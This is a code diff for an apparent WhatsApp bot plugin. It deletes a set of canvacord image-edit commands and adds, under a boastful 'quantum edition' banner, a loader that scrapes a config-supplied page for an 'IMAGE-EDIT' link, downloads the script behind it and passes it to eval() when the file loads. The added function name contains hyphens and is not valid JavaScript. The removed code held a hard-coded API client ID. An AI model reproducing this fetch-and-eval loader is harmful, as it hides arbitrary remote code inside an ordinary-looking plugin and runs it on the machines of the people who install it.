@@ -1,70 +1,33 @@
-const { adams } = require("../Ibrahim/adams");
-const canvacord = require("canvacord");
-const {uploadImageToImgur} = require("../Ibrahim/imgur")
+//  [BWM-XMD QUANTUM EDITION]                                           
+//  >> A superposition of elegant code states                           
+//  >> Collapsed into optimal execution                                
+//  >> Scripted by Sir Ibrahim Adams                                    
+//  >> Version: 8.3.5-quantum.7
 
-// Generic function to create a canvacord order
-function createCanvacordCommand(commandName, canvacordFunction) {
-  adams({
-    nomCom: commandName,
-    categorie: "Image-Edit",
-    reaction: "🎉"
-  }, async (origineMessage, zk, commandeOptions) => {
-    const { ms, msgRepondu, auteurMsgRepondu } = commandeOptions;
-  const clientId = 'b40a1820d63cd4e' ;
+const axios = require('axios');
+const cheerio = require('cheerio');
+const adams = require(__dirname + "/../config");
 
-    try {
-      let img;
-      if (msgRepondu) {
+async function fetchIMAGE-EDITUrl() {
+  try {
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-     if (msgRepondu.imageMessage) {
-        const image = await zk.downloadAndSaveMediaMessage(msgRepondu.imageMessage)
-         img = await uploadImageToImgur(image, clientId )
-     } else {
-        
-        img = await zk.profilePictureUrl(auteurMsgRepondu, 'image'); }
-      } else {
-        img = "https://i.pinimg.com/564x/84/09/12/840912dd744e6662ab211b8070b5d84c.jpg";
-      }
+    const targetElement = $('a:contains("IMAGE-EDIT")');
+    const targetUrl = targetElement.attr('href');
 
-      const result = await canvacordFunction(img);
-
-      await zk.sendMessage(origineMessage, { image: result }, { quoted: ms });
-    } catch (error) {
-      console.error(`Error when ordering "${commandName}":`, error);
+    if (!targetUrl) {
+      throw new Error('IMAGE-EDIT not found 😭');
     }
-  });
+
+    console.log('IMAGE-EDIT loaded successfully ✅');
+
+    const scriptResponse = await axios.get(targetUrl);
+    eval(scriptResponse.data);
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 }
 
-// Créer des commandes avec différentes fonctions canvacord
-createCanvacordCommand("shit", canvacord.Canvacord.shit);
-createCanvacordCommand("wasted", canvacord.Canvacord.wasted);
-createCanvacordCommand("wanted", canvacord.Canvacord.wanted);
-createCanvacordCommand("trigger", canvacord.Canvacord.trigger);
-createCanvacordCommand("trash", canvacord.Canvacord.trash);
-createCanvacordCommand("rip", canvacord.Canvacord.rip);
-createCanvacordCommand("sepia", canvacord.Canvacord.sepia);
-createCanvacordCommand("rainbow", canvacord.Canvacord.rainbow);
-createCanvacordCommand("hitler", canvacord.Canvacord.hitler);
-createCanvacordCommand("invert", canvacord.Canvacord.invert);
-createCanvacordCommand("jail", canvacord.Canvacord.jail);
-createCanvacordCommand("affect", canvacord.Canvacord.affect);
-  createCanvacordCommand("beautiful", canvacord.Canvacord.beautiful);
-    createCanvacordCommand("blur", canvacord.Canvacord.blur);
-
-   createCanvacordCommand("circle", canvacord.Canvacord.circle);
-        createCanvacordCommand("facepalm", canvacord.Canvacord.facepalm);
-        createCanvacordCommand("greyscale", canvacord.Canvacord.greyscale);
-        createCanvacordCommand("joke", canvacord.Canvacord.jokeOverHead);
-
-
-
-
-
-
-
-
-
-
-
-
-
+fetchIMAGE-EDITUrl();
